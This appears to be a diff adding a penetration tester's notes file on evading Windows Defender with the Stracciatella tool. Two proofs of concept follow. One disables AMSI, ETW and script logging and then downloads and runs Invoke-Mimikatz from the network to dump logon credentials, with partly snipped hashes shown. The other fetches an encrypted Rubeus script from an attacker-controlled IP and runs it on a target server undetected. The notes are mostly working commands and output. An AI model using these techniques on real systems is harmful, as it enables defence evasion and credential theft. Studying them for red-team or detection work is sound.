@@ -1,0 +1,129 @@
+================================================================================================================================
+Antivirus bypass using the tool 'Stracciatella'
+================================================================================================================================
+
+PowerShell runspace from within C# (aka SharpPick technique) with AMSI, ETW and Script Block Logging disabled at startup.
+
+=> https://github.com/mgeeky/Stracciatella
+
+(SharpPick idea = launch powershell scripts from within C# assembly by the use of Runspaces)
+
+
+================================================================================================================================
+PoC 1 - Running 'invoke-mimikatz' with 'Stracciatella' on a Windows 10 laptop without getting detected by Windows Defender
+================================================================================================================================
+
+PS C:\Users\Administrator\Documents\Tools-Pentest\Stracciatella> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 13/02/2023 08:32:06
+
+
+PS C:\Users\Administrator\Documents\Tools-Pentest\Stracciatella> .\Stracciatella.exe -v
+
+  :: Stracciatella - Powershell runspace with AMSI, ETW and Script Block Logging disabled.
+  Mariusz Banach / mgeeky, '19-22 <mb@binary-offensive.com>
+  v0.7
+
+[.] Powershell's version: 5.1
+[.] Language Mode: FullLanguage
+[+] No need to disable Constrained Language Mode. Already in FullLanguage.
+[+] Script Block Logging Disabled.
+[+] AMSI Disabled.
+[+] ETW Disabled.
+
+Stracciatella C:\Users\Administrator\Documents\Tools-Pentest\Stracciatella> IEX (New-Object Net.WebClient).DownloadString('https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1');
+PS> IEX (New-Object Net.WebClient).DownloadString('https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1');
+
+Stracciatella C:\Users\Administrator\Documents\Tools-Pentest\Stracciatella> Invoke-Mimikatz
+PS> Invoke-Mimikatz
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 487989225 (00000000:1d161fe9)
+Session           : Interactive from 13
+User Name         : Administrator
+Domain            : Laptop1
+Logon Server      : Laptop1
+Logon Time        : 14/02/2023 13:55:22
+SID               : S-1-5-21-936125016-2310263949-2175806047-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : Laptop1
+         * NTLM     : 36f7a3ebaa54935ecf03678e11<snip>
+         * SHA1     : d5feabcececab0e16c2cbb3917<snip>
+        tspkg :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : <snip>
+        wdigest :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+<snip>
+
+
+==================================================================================================================================
+PoC 2 - Running an encrypted version of 'invoke-rubeus.ps1' using 'Stracciatella' on a Windows 10 laptop without getting detected
+		    by Windows Defender
+==================================================================================================================================
+
+First we encrypt the script 'invoke-rubeus' using the PowerShell crypter script 'XenCrypt.ps1' (https://github.com/the-xentropy/xencrypt)
+Then we download and run it on a target Windows server with 'Stracciatella.exe'.
+
+PS C:\temp> wget -URI http://192.168.1.110:8080/Xencrypt-Invoke-Rub3us.ps1 -OutFile C:\temp\Xencrypt-Invoke-Rub3us.ps1
+
+PS C:\temp> wget -URI http://192.168.1.110:8080/Stracciatella.exe -OutFile C:\temp\Stracciatella.exe
+
+PS C:\temp> exit
+
+C:\temp> Stracciatella.exe -v
+
+  :: Stracciatella - Powershell runspace with AMSI, ETW and Script Block Logging disabled.
+  Mariusz Banach / mgeeky, '19-22 <mb@binary-offensive.com>
+  v0.7
+
+[.] Powershell's version: 5.1
+[.] Language Mode: FullLanguage
+[+] No need to disable Constrained Language Mode. Already in FullLanguage.
+[+] Script Block Logging Disabled.
+[+] AMSI Disabled.
+[+] ETW Disabled.
+
+Stracciatella C:\temp> . .\Xencrypt-Invoke-Rub3us.ps1
+PS> . .\Xencrypt-Invoke-Rub3us.ps1
+
+Stracciatella C:\temp> Invoke-Rubeus currentluid
+PS> Invoke-Rubeus currentluid
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.4
+
+[*] Action: Display current LUID
+
+[*] Current LogonID (LUID) : 0x1d161fe9 (487989225)
+
+Stracciatella C:\temp>
